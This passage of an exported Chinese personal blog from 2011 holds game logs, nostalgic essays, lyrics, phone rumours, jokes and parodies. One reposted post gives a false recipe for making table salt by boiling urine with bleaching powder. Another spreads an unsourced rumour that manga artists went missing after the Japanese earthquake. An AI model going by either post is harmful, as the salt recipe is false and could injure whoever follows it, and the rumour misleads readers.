回合18：乐斗帅帅大喝一声，空手打出一记炮拳！iMaeGoo_墨云〃吃了一招，HP-34（HP余42）。 回合19：iMaeGoo_墨云〃凝神摒气使出会心一击，iMaeGoo_墨云〃摸出红缨枪二级，直攻对方中线。乐斗帅帅吃了一招，HP-56（HP余0）。乐斗帅帅中招身亡，实在是不堪一击！战斗结束：胜利！你将乐斗帅帅打得落花流水！","link":"/2011/025_2011-06-0418_44/"},{"title":"《二十五天以后，我们不再有初三，不再有中考…》献给陪我一起走过这风风雨雨中的兄弟姐","text":"25天以后，我们不再初三，凋落的记忆，循环的周期！ ­ 2008年、秋天、我们来到一起、­ 2011年、夏天、我们离开、也是一起、­ 时间风干了写满字迹的试卷，却没有风干那些单纯的记忆。­ 三年春秋的笑与泪，一幕幕徘徊眼前。­ 恍恍惚惚，­ 尘封的往事宛如潮水，冲破记忆的闸门，变成滚滚泪海。­ 昔日的点滴化作一股暖流，淌过心间。­ 熟悉的青春旋律，游离耳畔，忽远忽近。­ 六月以后，我们不再初三。­ ­ 三年来，我们 ­ 习惯了在天朦胧的时候起床，­ 习惯了带着惺松的睡眼刷牙、洗脸，­ 习惯边走边咒骂着可恶的教育制度并计算距离下次放假的时间，­ 进到教室本该早读的，但却在老师走了之后偷偷吃零食…­ 课堂上，满脑子的睡意直想让自己在铃声响起那一刻睡去，­ 把书堆得高高的，假装低着头看书，却在头放在书上那一刻安然睡去，­ 或者，在高大书堆的掩护下，在手机键盘上“运指如飞”，在小说世界里“流连忘返”。­ 在书堆下疯狂过瘾后，抬起头，忽然看见了中考的倒计时，­ 于是，无奈地抓起书本，心烦意乱地翻一翻。­ 我们习惯了在看过课程表后，埋怨尽是语文、数学、英语、政治（物理）、历史（化学）、地理（生物），却很少有自己喜欢的体育。­ 我们习惯了计划着语文课上看小说，计划着数学课上捧着手机“厮杀”，计划着英语课可以不听老师的话美美地睡一大觉。­ 可六月以后，我们不再初三了。­ ­ 喜欢在书桌上写满自己的青春誓言，­ 喜欢在墙上写下自己的无奈，­ 喜欢在课堂上飞快地按着手机键盘，­ 喜欢在下课铃声响起的那一刻悄然睡去，­ 喜欢午睡时塞上耳机听几首自己喜欢的歌再睡，­ 喜欢在活动课时跑到球场“大汗淋漓”；­ 喜欢看看自己好久没看的杂志、报纸；­ 喜欢站在阳台上望着楼下走过的男生、女生，并大肆点评一番；­ 喜欢一群朋友在一起吹嘘一番，炫耀自己的聪明才智；­ 喜欢一群朋友在一起，发泄一下自己无奈的青春；­ 喜欢在教室里经常调换座位，并和“新同桌”小声讨论；­ 喜欢在聊天时给老师乱起外等­ 喜欢在楼道或走廊与自己喜欢的那个TA来个刻意的不期而遇；­ 喜欢在走路时睁大眼睛瞧瞧四周有没有自己喜欢的帅哥、美女；­ 喜欢在洗澡的时候，扯开喉咙高歌N曲，然后在舍友大笑跑调时，仍然自顾自地唱得起兴，并后悔自己当初没有选择读音乐；­ 喜欢到处散播着自己也不知道从哪里听来的放假谣言；­ 喜欢每晚期待不用上第三节自修；­ 喜欢在晚睡前和舍友叽哩呱啦地瞎扯一番；­ 喜欢每晚在被窝里玩会儿手机才睡；­ 喜欢每天早上赖会儿床，并迟一点上教室；­ 喜欢……­ 可六月以后，我们就不再初三了。­ ­ 害怕着每一次的考试，却又期待着每一次考试自己会取得好的成绩；­ 害怕成绩的宣布，却又期待着成绩的宣布，看看自己的排名是否已上升；­ 假装不关心自己的成绩，却在没人的时候把排名看了一遍又一遍，然后默默走开；­ 心想：如果下次考试如果再不进步，我就不再努力了，可自己不管进步退步，努力的汗水都从没有停止流过。­ 可六月以后，我们就不再初三了。­ ­ 习惯了早上六点多起床；­ 习惯了闭着眼睛刷牙；­ 习惯了吃饭堂不太好吃的饭；­ 习惯了上课干着与学习无关的事，还得时刻警惕后门和窗户出现值日领导的丑恶嘴脸，每当值日领导出现时，大家几乎都条件反射般熟练地将书桌里的手机、小说推进去，然后笔直地坐好，装模作样地拿着写不出字的笔，认真看着黑板，脑子里却盘算着值日领导走了没，片刻之后，听到了周围的喧闹声，会心一笑，是的，危险解除了。­ 可六月以后，我们就不再初三了。­ ­ 一转眼，我们即将离别初三的苦日子，一切的习惯都变得那么不习惯了。­ 以为自己的青春在初三结束的那一刻也许会得到释放，以为自己会迎来人生的又一春。­ 可我们却又常常想起初三三年的日子，­ 想回到初一的教室看看自己在书桌上、墙上留下的笔迹，­ 想回到初二的教室看看写满作业的黑板，­ 想回到初三教室看看黑板上的中考倒计时，­ 想见见一起在中考战线上拼命的同学们，­ 想见见课堂上不忍心将你从睡梦中吵醒的同桌，­ 想见见给我们人生指路的恩师，­ 想见见那充满我们欢声笑语的校园。­ ­ 回想起初三三年的日子，总有一股想哭的冲动，心中是多么的惆怅与不舍。­ 即-­ 将逝去的初三岁月，永远是我们心中关于青春的最美好的回忆。­ 初三，想想不免有些苦涩，苦涩的不是经历那几年的生活，而是不再拥有那样的生活。­ 曾经的同学，曾经的老师，曾经的校园，都已渐渐远去，仅留下那不太完美的记忆。­ 六月以后，我们不再初三。­ ­ 六月以后，我们将各奔东西，那时，事过境迁的凄凉和失落，会在心底蔓延开来，离别多么忧伤，泪水簌簌而下。­ ­ 又是一个花开的季节，无数满怀理想的追梦者又进入最后的冲刺阶段，你我都不会孤单，因为我们都是同一条战线上的战士。­ 献给即将毕业的、、你们、、、、、­","link":"/2011/026_2011-05-2921_01/"},{"title":"玉树地震一周年，为遇难同胞默哀！","text":"2010年4月14日，玉树州发生强烈地震，灾区人民生命财产遭受巨大损失。 今天是玉树地震一周年纪念日，各地都以各自不同的方式纪念那场震撼大地的伤痛瞬间，铭记那些深入人心的感动记忆… 我们永远忘不了那一刻，2010年4月14日上午7时49分，让全体同胞心碎的一刻…让我们为在玉树7.1级地震中不幸遇难的同胞和在抗震救灾斗争中英勇献身的烈士祈祷、默哀… 就让我们用真挚的情、细腻的爱、动情的语言来讴歌地震中的英雄，来缅怀逝去的同胞，赞颂幸存者的坚强、乐观，期盼未来日子的平安与幸福吧！ 同时也希望有关部门能够持续、继续关注汶川、玉树…祈祷、默哀…","link":"/2011/028_2011-04-1413_24/"},{"title":"想象之中","text":"想象之中雨过一道彩虹抬起了头紫色蔚蓝天空想象之中付出会有结果毫无保留信奉你的承诺想象之中这次要爱很久我领略过你眼里的温柔热恋之后你忽然的冰冻判若两人丢给我去承受 想象中 很不同（想象中一切都和后来很不同）我承认曾经那么心动 你没想象之中那么恋旧回忆换不回你的温柔最后也不是枯坐了梦转过头我怎么有一滴泪落 我没想象中那么脆弱分开后形容也没消瘦一起踏过了几座春秋领悟了爱不是追逐占有想象之中 这次要爱很久我领略过 你眼里的温柔热恋之后 你忽然的冰冻判若两人 丢给我去承受 想象中 很不同（想象中一切都和后来很不同）我承认曾经那么心动 你没想象之中那么恋旧回忆换不回你的温柔最后也不是枯坐了梦转过头我怎么有一滴泪落我没想象中那么脆弱分开后形容也没消瘦一起踏过了几座春秋领悟了爱不是追逐占有你没想象之中那么恋旧回忆换不回你的温柔最后也不是枯坐了梦转过头我怎么有一滴泪落 我没想象中那么脆弱分开后形容也没消瘦一起踏过了几座春秋领悟了爱不是追逐占有","link":"/2011/030_2011-04-0122_25/"},{"title":"麦吐司17日通告-日本漫画家安全通告","text":"已确认安全的：尾田荣一郎《海贼王》井上雄彦《灌篮高手》吉崎观音《keroro 军曹》神尾叶子《流星花园》藤泽亨《麻辣教师 GTO》 下落不明的：岸本齐史《火影忍者》青山刚昌《名侦探柯南》车田正美 《圣斗士星矢》高桥留美子《犬夜叉》荒川弘《钢之炼金术士》 ….【转发】今天上午10:21麦吐司发来的确切消息","link":"/2011/031_2011-03-1723_35/"},{"title":"教大家一个自制食盐的方法~","text":"那些没有买到盐的人其实不用急~每天自已撒的尿可以用盆存起来【这是分享…仅仅是分享！麦咕是决不会实验的= =+转自百度贴吧….】先用纱布虑一道加入少量漂白粉~放火上煮干~就会有少量晶体析出~这里面的主要成份就是盐~一般一个家庭一天可产盐十至二十克~足够一家人用了~所以别急~办法总是有的~","link":"/2011/032_2011-03-1723_14/"},{"title":"异性铁哥们","text":"有种朋友，很喜欢，但就是不能追、你懂的、 男生说……有种女生让我很喜欢，却不忍动情。跟那种女生在一起时，会有种温暖的感觉，那感觉并不出自一时的冲动,而是来自于彼此心灵的了解。真的，跟那种女生在一起时，只有彼此心中的感动和心灵的交会，没错，当你发现她的心和你是如此贴近时，常会想给她个结实的拥抱，但仅仅在这个想法萌生后的一瞬间，你们只会相视一笑，有些东西是比爱情更珍贵的。这种女生当女朋友是种浪费……我害怕她做的我女朋友后,我必须每天守着电话等着她的声音出现，我害怕我必须说些花言巧语的话哄她，更加害怕现实的束缚，会限制住纯洁的心。这种女生，喜欢，但我不会动情，或者，这就叫红颜知己……既不用为情所困，为她的行为控制自己喜怒哀乐，又能享有心灵上的交流。有很多人都为交不到女朋友所苦，但我觉得，假如没有了这种知己，人生，便多了许多遗憾…… 女生说……有一些男生，很令我动心，但却不会动情。怎么说呢，因为他们给我的感觉像朋友，真正的朋友 。我可以和他们很坦诚的谈论彼此的爱情、婚姻、人生……以及种种的烦恼……在他们面前，我会忘记自己是女生，就不会撒娇、嫉妒、小心眼……我和他们各站在天平的两端，我们可以一同看电影、郊游回来，在车站挥挥手，各自去等自己的车，走自己的路。这种感觉……是一种很难用语言能形容的愉悦……信不信 ，跟这些男生相处在一起，甚至比跟同类的女生相处来的愉快。女生的聚会，是黏稠稠的，像一锅浓粥，温暖在胸，但是吃多了会撑，一眨眼又饿，而且很多女生都为情所困，谈来谈去总是心有千千结，别人管也管不完，跟这些男生相处，我很惊讶……他们不必从文字、故事的迷林披荆斩棘，就能一眼洞穿人生的奥秘，甚至开始为旁边的同行者掌灯，能结交有智慧、理想与热情的朋友，是人一生莫大的幸福吧 。我是这样着迷于他们高贵的气质，也感谢他们把我当「朋友」看待，不因为我是女生，就随便说些甜言蜜语来哄我，或者根本不睬我 。如果追求人生的伴侣也必须如此相知相惜，那我实在「舍不得」把这些男生当成男朋友，我害怕一旦变成男女朋友，我就会计较他不送我回家……他不说些好听的动心话……他宁可送我「尼采与上帝」也不送一粒巧克力……我还担心从此他只要我乖乖的陪在一旁，微笑地看他在众人间侃侃而谈，我发问的机会都没有。 男女之间，其实不只有爱情……有种友情，是只可会意不可言传的。彼此之间有种惺惺相惜的感觉，不必害怕别人的误会，因为彼此心中坦荡，很喜欢这种“兄弟”之称的友谊，这种朋友有种信赖的安全感，可以肆无忌惮的说笑，天马行空的胡扯，彼此之间没有包袱，但有种珍惜，是对友谊的珍惜。你也许会对他(她）撒娇，但不会妒忌他（她）对别人也如此，不用再他面前装做淑女（或不用在她面前装做绅士），有种朋友即使很久没见也不会生疏，相见时的相视一笑，便会有种心有灵犀的感觉，和他（她）在一起时，不必担心会背叛你，因为他只会给你默默地支持，即使你受伤了，他也会给你做坚强的后盾。心情不好时，他(她)会装傻逗你笑，生病时，他(她)会叮嘱你要小心什么，每逢特别节日时，他（她)会发一条简信祝福你，很多人都希望有这种友谊，因为它不需要负担与责任，我想这种友谊也要讲机缘吧，友谊也需要关心、谅解、信任。我希望友谊地久天长。我很珍惜我身边的每一位朋友谢谢你们对我的支持与爱护。","link":"/2011/033_2011-03-1419_21/"},{"title":"我的2011年新年行程","text":"仿佛清脆的鞭炮还在耳边炸响，仿佛耀眼的彩灯还在眼前缭绕，仿佛醉人的祝福还在脑际回荡，回顾2011年我的春节行程，就仿佛一切还都是昨天： 腊月廿七腊月廿八腊月廿九腊月三十正月初一正月初二正月初三正月初四正月初五正月初六正月初七正月初八正月初九正月初十正月十一正月十二正月十三正月十四正月十五 时间总是那么易逝!新的一年开始了！祝大家2011年万事如意，心想事成！","link":"/2011/035_2011-02-1808_35/"},{"title":"屏幕增大,iPhone5设计图惊曝","text":"苹果iPhone 5工程设计图 (来源：3G门户手机频道专稿 文/欢少) 备受期待的苹果iPhone5的程机日前在互联网上曝光，与当前热卖的iPhone 4相比，外观设计变化并大，这与我们的预测一致。 但从iDealsChina泄露的工程图看，iPhone 5外观与iPhone 4相比并没有太大变化，只是屏幕尺寸有所增大，与此前猜测的4.0英寸比较吻合。事实上业内人士称，在苹果产品的重新设计方面，iDealsChina的消息一向比较准确。苹果iPhone 5工程设计图苹果iPad 2震撼发布 苹果iPad 2隆重上市，而各界对iPad 2这样那样的评价已经足够多了，在此不妨换个全新角度透过苹果最新发布的iPad 2窥探将要在数月后隆重登场的iPhone 5。怎么样，够吸引了吧？Let”s Go！白色版iPhone 4或成浮云 跳过第四代，第五代iPhone迎来白色 本次发布会上，曾经有传言称苹果会宣布白色版iPhone 4上市，然而最后大家等到的反而是白色版的iPad 2，这个意外之外的意外表明苹果大批量生产白色版的iPad 2已不成问题，白色版的iPhone理应也解决了工艺瓶颈，至于为何白色iPhone 4还未上市，种种迹象表明苹果很有可能直接跳过此前难产的白色iPhone 4而推出白色iPhone 5！苹果A5双核处理器 尽管iPad 2的处理器主频仍然是1GHz，然而全新的A5处理器采用双核构架，带来了更高的功效且能耗更低。强劲的A5处理器为iPad 2带来了双倍于iPad的性能，而图形处理能力更是高达原来的九倍之多！面对Android平板和手机今年开始兴起的双核军团，苹果首先用iPad 2给力的性能配置给予回应，相信数月后的iPhone 5也会顺理成章的搭载A5处理器，继续保持顶级的处理能力。iOS4.3多项提升 搭载iOS4.3或更高的系统版本 3月11日起iPad 2面向美国市场率先发售，届时将搭载iOS4.3系统，乔布斯还表示当天iPhone的GSM版本以及iPod Touch第三代、第四代都可以获得iOS4.3的同步升级。考虑到距离iPhone 5的推出还有数月之久，不排除iOS届时会升级到更高的版本，而iPhone 5无疑会是受益者。 在此顺便罗列iOS 4.3的新亮点： 1.增加四指或五指手势操作、主页多点触控缩放、向上滑动显示多任务栏、左右滑动切换应用等多种手势操控； 2.优化Safari浏览器，上网速度更快； 3.升级AirPlay无线流媒体功能； 4.新增iTunes家庭共享功能，不同的iOS设备通过共享网络达到实时同步的效果； 5.无线热点功能，能够让其它WiFi设备共享无线网络。专用HDMI数据线 借助专用数据线实现HDMI高清输出 在性能大幅度提升的同时，iPad 2基于更强悍的处理能力提供了HDMI高清输出功能，不过用户需要另行购买价值39美元（折合人民币约256元）的专用数据线来完成最高可达1080p的视频输出。苹果产品向来在数据接口方面保持高度的统一（30针接口），相比iPhone体积更大的iPad 2也要用额外的数据线来进行HDMI输出，iPhone 5即便加入日趋流行的HDMI输出估计也要兼容iPad 2的专用HDMI视频输出线。 双网双待可能性低，或推多版本 早在iPad 2发布之前，苹果已经发布并上市了CDMA版本的iPhone 4，而中国电信方面也在进行紧张的秘密测试，推出行货天翼版iPhone只是早晚的事情。按照这种形势来看，iPhone 5很有可能也会推出GSM/WCDMA版与CDMA版。 前不久国外网站拆解CDMA版iPhone 4后发现其芯片是支持双网络的，也就是说只要苹果愿意，新的iPhone完全可以做成支持直接双模。但由于iPhone 4内部的空间已经相当紧凑了，苹果基本上不会将iPhone 5打造成双网双待，有可能会选择与摩托罗拉里程碑2全球版那样的一个卡槽兼容多种网络制式。说到这里不经意想到了本人偏爱的TD网络，不知苹果是否会在iPhone 5上与中国移动的G3网络也有交集，但愿双方都能给力吧。 然而大家千万不要忽略了苹果的经济头脑，选择单卡多模虽然方便了用户却并不能将收益最大化，因此与多家运营商合作才是苹果的最佳选择，所以我们更倾向于iPhone 5会推出面向不同网络制式的多版本。 更薄、更大屏、NFC…… 以苹果的风格来分析，iPhone 5应该不会在外观设计上进行大变身，但为了增加卖点有可能会更进一步进行薄身处理，个人觉得这个倒不重要。至于屏幕，640×960像素的分辨率足够了，屏幕尺寸是否增大则是挺大的一个悬念，我们更偏向于iPhone 5会使用4.0英寸的屏幕，为了实现这一目的不排除苹果会取消Home键，iOS4.3的手势操控已为苹果的**铺平了道路。 手机支付无疑是前景无限的移动应用，关于iPhone 5会内置NFC芯片的消息其实很早便已提出，这项呼声很高的功能也有望成为iPhone 5的一道亮点。 随着iPhone 5发布的临近，接下来几个月关于iPhone 5各方面的猜测还会越来越多，而我们以上所做的分析大部分是基于本次iPad 2升级所进行的合理推断，参考价值较高。随后时间我们会继续关注苹果iPhone5的最新动态并第一时间与大家分享，期待乔布斯还能以健康的姿态穿着我们熟悉的高领毛衣和牛仔裤，为我们揭开iPhone 5的一切谜底。","link":"/2011/034_2011-03-1321_15/"},{"title":"诺基亚与苹果的区别","text":"1.诺基亚像老婆，苹果像情人。 2.诺基亚价格实惠，长相一般，是老婆的不二人选；苹果长的漂亮，要搞定得用票子。 3.诺基亚带出去很普通，就像老婆带出去很大众化；苹果带出去很有回头率，满足了虚荣心。 4.诺基亚用着很放心，就像老婆死心塌地的；苹果用着老是怕被偷，就像情人还有好多眼睛也盯着。 5.诺基亚作为手机，基本的通话和短信功能都很实用，就像老婆做饭，洗衣服之类的事情都很不错；而苹果呢，基本的电话和短信功能一般，就像情人一样，不愿做饭，也不愿洗衣服。 6.诺基亚很多软件随便下一个就可以装上去用了，就像老婆随便买件衣服就穿了，不是很讲究；而苹果呢，就像情人，什么都得讲究正品，必须还要用iTunes来下载安装。 7.诺基亚比较耐摔，就像老婆时常闹些别扭但总归会和好的；而苹果呢，往往不会给你摔第二次的机会。 转自飞信空间精彩日志","link":"/2011/036_2011-02-0913_48/"},{"title":"历届春晚爆笑穿帮全纪录","text":"春晚现在也成了“找碴”大会，各种穿帮被细心网友纷纷扒出，小编就带您看看历届春晚的爆笑穿帮，这些可都是网友的功劳哟…… 男伴舞上来帽子就掉了…… 凤凰传奇上场时的直播还可以看到舞台上遗落的帽子 镜头一转，帽子没有问题，右一伴舞却惊现“拉链门” 没拉拉链的小哥欢乐的跳着 录播带与直播的切换露了馅，王菲一个镜头是面对观众另一个镜头是头偏向一边，造成了王菲假唱的误会。 演员身体和腿奔跑的方向相反，舞台中间还有前面一个节目演员脱落的鞋子 牛莉的名牌大衣还没有剪标签 现场直播时，舞蹈演员裙子上的绿色配饰脱落，掉在了舞台上 热闹的群舞画面，能清楚看到演员脚下掉落的帽子 9套画面(上)与1套画面，董卿的衣服不同 主要不同：1.董卿服装一绿一粉。2.汇源果汁在9套的版本中消失。3.董卿右侧男子摘掉了围巾。4.右三的女子在两个版本中完全不同。 刘谦、董卿这段对话绝对不能往深处想！ 刘谦：“董卿小姐，坚硬吗？” 董卿：“……嗯，坚硬！” 刘谦：“你要我从哪个地方穿过去？” 董卿：“……中间吧！” …… 董卿：“刘谦再来一次嘛~” …… 董卿：“（刘谦你）太棒了！” 董卿：“一年不见，你的手越来越灵活了……真是太棒了 看这鞋…… 09年董卿经典的口误：把马季师父的儿子马斌说成了“马季” 董卿曝光了和刘谦的作弊 刘谦：我们要用到另外一颗鸡蛋，来（主持人）再选一颗。 董卿（一惊，没反映过来）：啊？现在？ 刘谦：挑，挑一颗，挑一颗。 董卿（把话筒放下拉远）：是有戒指的那颗吗？ 放很大声音可以听到 刘谦：挑鸡蛋，鸡蛋 从五分钟开始，音量调到最大可以听到董卿说“是有戒指的那颗吗？” 08年春晚的舞蹈中，演员在前面表演，后面有位淡定的仁兄横穿了舞台 章子怡上万元的妆容配了一个毫无底气的假唱 开场主持人字幕出错 07年春晚太经典的“黑色三分钟”，貌似是李咏抢词、忘词又抢词 李咏忘词，周涛赶紧救场，李咏又抢词，周涛很不爽的白了他一眼 92年小品，起先，黄宏的袜子是白色的 忽然变成了黑色 继续黑色 然后又白了 还有一个另类的看点就是我们刚被判刑的宋山木大叔……白衬衣配背带裤小领结，05年“吊带装”首次公众于世，只是让我没想到这套战衣一穿就是六年！六年啊! 这个是06年，鼓起掌来小手piapia地，频率都比别人快三倍 07年，激动了！小领结都抖擞起来了！这次吊带装被低调地掩藏在华丽丽的白西装里。 08年，笑得那叫一个灿烂！ 09年，去年竟然改中式了！原本以为是他低调了，但金光闪闪的小立领“赤果果”地暴露了他那颗抢镜的心！ (东北新闻网)","link":"/2011/037_2011-02-0311_22/"},{"title":"《忐忑》歌词，欢迎学习。","text":"ā…á….ǎ…à..哦！ā…á….ǎ…à..哦诶！阿的弟，阿的刀，阿的大的提的刀。阿的弟，啊得提大刀。ā…á….ǎ…à..哦！ā…á….ǎ…à..哦诶！阿的弟，阿的刀，阿的大的提的刀。阿的弟，啊得提大刀。 啊~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 啊伊呀伊呦，啊伊呀伊呦，阿弟可带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，啊伊呀伊呦。 ā…á….ǎ…à..哦！ā…á….ǎ…à..哦诶！阿的弟，阿的刀，阿的大的提的刀。阿的弟，啊得提大刀。ā…á….ǎ…à..哦！ā…á….ǎ…à..哦诶！阿的弟，阿的刀，阿的大的提的刀。阿的弟，啊得提大刀。 啊~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 啊伊呀伊呦，啊伊呀伊呦，阿弟可带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，啊伊呀伊呦。 （音乐伴奏） 啊伊呀伊啊伊呀伊啊伊啊伊啊伊呀，阿弟可带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，啊伊哦呦。 （音乐伴奏） 大米要米大米要米大米咱们家里哪还一耳油，大米要米大米要米大米咱们家里哪里还会有。 大姨大姨大姨大姨大姨大姨大姨大姨大姨大姨大姨大姨大姨大姨大姨给了一刀。 啊~~~~~~~~~啊诶！啊伊呀伊呦。 啊~~~~~~~~~~~腰，啊~~~~~~~~~~啊伊呀伊呦，嘿呦！ ā…á….ǎ…à..哦！ā…á….ǎ…à..哦诶！阿的弟，阿的刀，阿的大的提的刀。阿的弟，啊得提大刀。ā…á….ǎ…à..哦！ā…á….ǎ…à..哦诶！阿的弟，阿的刀，阿的大的提的刀。阿的弟，啊得提大刀。 啊~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 啊伊呀伊呦，啊伊呀伊呦，阿弟可带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，阿弟可带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，带一个带一个带一个他可带一个带一个刀，带一个带一个带一个带一个带一个带一个带一个带一个带一个带一个刀。 啊伊呀伊啊伊呀伊啊伊啊伊啊伊啊伊，腰~~~~~~~~~~~~~~啊~~~~~~~~~~~~~~~~！ 带一个带一个带一个他可带一个带一个带一个带一个刀！ 哎哟，哎哟带哪个套，带哪个套，带哪个带哪个，带哪个套哟！哎呀带哪个套，哪里带个哪里带个套，哪里带个套～哪里带个套，啊啊啊，啊哎唷，啊，啊啊，啊啊啊，哎呀哎哟，带啊，啊哦，带你个套，带你个套，哎药带个套，嗯，嗯嗯，啊啊，带个你套，带哪个带哪个套，带个带带个带带带个套，带带带带带带带带带带带带带带带带带带带带带带带带带个套，哎一哎一哎呀哎哟带你个套套！ 哎好难套啊 ============================================ 补充版： 啊啊啊啊啊啊啊啊哦 啊啊啊啊啊啊啊啊哦诶 啊鸡低 啊鸡动 啊鸡打了地个洞 啊鸡低 啊鸡打个洞 啊啊啊啊啊啊啊啊哦 啊啊啊啊啊啊啊啊哦诶 啊鸡低 啊鸡动 啊鸡打个地个洞 啊鸡低 啊鸡打了地个洞 啊啊啊啊 啊啊啊啊 啊啊啊啊啊啊啊阿姨压抑哟 阿姨压抑哟 啊擦几个蛋 这个蛋 这个蛋 这个蛋个鸡个 蛋 这个蛋 找个洞 蛋几个蛋 这个蛋 这个蛋 这个蛋个鸡个 蛋 这个蛋 找个洞 阿姨压抑哦 啊啊啊啊啊啊啊啊哦 啊啊啊啊啊啊啊啊哦诶 啊鸡低 啊鸡动 啊鸡打个地个洞 啊鸡地 啊鸡打个洞 啊啊啊啊啊啊啊啊哦 啊啊啊啊啊啊啊啊哦诶 啊鸡低 啊鸡动 啊鸡打个地个洞 啊鸡低 啊鸡打个洞 啊啊啊啊 啊啊啊啊 啊啊啊啊啊啊啊阿姨压抑哟 阿姨压抑哟 啊擦几个蛋 这个蛋 这个蛋 这个蛋个鸡个 蛋 这个蛋 找个洞 蛋几个蛋 这个蛋 这个蛋 这个蛋个鸡个 蛋 这个蛋 找个洞 阿姨压抑哟 阿姨压抑阿姨压抑阿姨压抑阿姨 啊擦几个蛋 这个蛋 这个蛋 这个蛋个鸡个 蛋 这个蛋 找个洞 蛋几个蛋 这个蛋 这个蛋 这个蛋个鸡个 蛋 这个蛋 找个洞 阿姨压抑哟 大衣泳衣 大姨脱衣 大衣泳衣 大姨脱衣 大姨二用 大衣泳衣 大姨脱衣 大衣泳衣 大姨脱衣 大衣泳衣大姨快来咯 大衣用力大姨脱类（后面为鸟语，可理解为肠胃运动） 大姨大一捅 啊啊啊啊啊啊啊啊啊 诶~~阿姨压抑哟 啊啊啊啊阿姨压抑哟 啊啊啊啊啊啊啊啊啊啊 阿姨压抑哟~压抑哟 啊啊啊啊啊啊啊啊哦 啊啊啊啊啊啊啊啊哦诶 啊鸡低 啊鸡动 啊鸡打个地个洞 啊鸡低 啊鸡打个洞 啊啊啊啊啊啊啊啊哦 啊啊啊啊啊啊啊啊哦诶 啊鸡低 啊鸡动 啊鸡打个地个洞 啊鸡低 啊鸡打个洞 啊啊啊啊 啊啊啊啊 啊啊啊啊啊啊啊阿姨压抑哟 阿姨压抑哟 啊擦几个蛋 这个蛋 这个蛋 这个蛋个鸡个 蛋 这个蛋 找个洞 蛋几个蛋 这个蛋 这个蛋 这个蛋个鸡个 蛋 这个蛋 找个洞 阿姨压抑哦 蹬蹬个 蹬蹬个 蹬蹬个 蹬蹬个 蹬蹬个蹬蛋个洞 蹬蹬个 蹬蹬个 蹬蹬个 带个带 蹬蹬个蹬蛋个洞 带着个 带着个 带着个 刀割蛋 带着个蛋蛋割洞 带着个 带着个 带着个 刀割蛋 带着个蛋蛋割洞 带着个 带着个 带着个 刀割蛋 带着个蛋蛋割洞 带着个 带着个 带着个 刀割蛋 带着个蛋蛋割洞 带着个 带着个 带着个 刀割蛋 带着个蛋蛋割洞 带着个 带着个 带着个 刀割蛋 带着个蛋蛋割洞 带着个 带着个 带着个 刀割蛋 带着个蛋蛋割洞 带着个 带着个 带着个 刀割蛋 带着个蛋蛋割洞 带着个 带着个 带着个 带个蛋 带着个刀割蛋 带着割 带着割 带着割 刀割蛋 大割蛋个洞","link":"/2011/039_2011-01-2520_09/"},{"title":"乐斗那些事儿","text":"小小絮叨….好不容易考完试妈咪让我上了一回网，第一件事就是……呃……开机、、嗯！然后乐斗。大家都知道第一回电脑上会奖10个黄金卷轴和一些别的道具，结果……14个（原来有4个）卷轴咕想用来把神技升2级（概率写的是高）7次都没成功！唉。。。认了、 进入正题！话说班主任老杨不允许咱班化学邮箱号开农场来着。。但她没说不允许乐斗哈！咱们化学号已经光荣滴升11啦—— 图1 我每天练化学号，都是无人可打，只能无聊收徒，收重金属童鞋有上百次了吧、不过1次都没成功过（废话，他师傅26级，燃不着的火柴棒） 前天无聊上化学号加自己为好友 结果就在昨天，雷人哒一幕。。。 首先介绍下陪伴我多年的师傅—— 图2 这是我—— 图3 这个—— 图4 我这边—— 图5 我有点寒，然后上自己的号挑战化学号，居然险胜！！！ 今天再次电脑登陆，挑战化学号，又是一个险胜！要不是装死+闪避咕就Game Over了！我自卑了。。 录像咕存了——有兴趣大家可以观摩一下","link":"/2011/040_2011-01-1909_41/"},{"title":"考试版让子弹飞","text":"考试版让子弹飞 让子弹飞太火，搞笑版让考试飞，考试季，求全过。1、我以为，考试要一场一场考，卷子要一行一行抄，抄的太明显，会得个“蛋”。2、江湖本无考试，挂的人多了，也便成了考试。3、如果你死了，你就不用考试了；如果你考试了，你就永远死了！4、科都不挂，还算学生吗？！5、——你说说，是考试重要，还是哥们重要？——考试？——再想想！——不会是哥们吧？——再想想！——还是……考试？——没有考试，对我很重要！6、这科都挂到一年以后了，也就是西历2012年……7、何止是及格？简直就是挂科！8、笔在手，跟我走，卷子答案全都有！9、大风起兮卷飞扬，安得猛士兮挂四方。考试，必须取消，不取消不行！你想想，你回了家，跟着同学，吃着火锅，还唱着歌，突然就有人告诉你挂科了！所以，没有考试的日子，才是好日子！！10、——你这是要抄我的呢，还是要看我的呢？——先看后抄。——那你还是直接抄吧。——不看我怎么能抄的踏实呢！11、老师：题都谁泻给你的？！学生：说出来能换我个及格不？12、别蛋疼了，“蛋”在试卷上呢。13、我这学期来只有三个目的：不挂，不挂，还是TMD不挂！14、砸了你们！砸了！兔子都知道白天别偷卷子！六个人！还当着巡场老师的面！还让人看！啊呸！低能，我都天黑去。这种考试你们可以打点小抄，抄点，哪怕把条拿明面儿上呢？抄不了多少东西，哪怕把条做大呢？简直就是白痴，白痴都不如。还说让人家老师帮你们过，就是一句话：低能！科肯定是挂定了！恶心啊，恶心！15、——大哥你是了解我的，我从来不抄人答案，我喜欢被抄。——大哥你是了解我的，以我的习惯，挂了也不抄人家的。——大哥你是了解我的，如果是我抄，不会有人活着去告老师。——大哥你是了解我的，我老五虽然读书时间最长，我、我至今，俗称挂科男。——别看着我呀！大哥你是了解我的，如果我出手，那挂科的，应该是借我抄的那个人。16、你TM给我TM说说什么是TMD挂科！17、我怎么觉着这挂科才刚刚开始呢？18、——“挂”气外露，找死！——一进校就挂科，看来这劝退令还打发不了他！——不急，让他挂挂！19、让科先挂一会儿！","link":"/2011/041_2011-01-1720_21/"},{"title":"小时候  小时候  我们的小时候","text":"小时候、特天真，特容易满足， 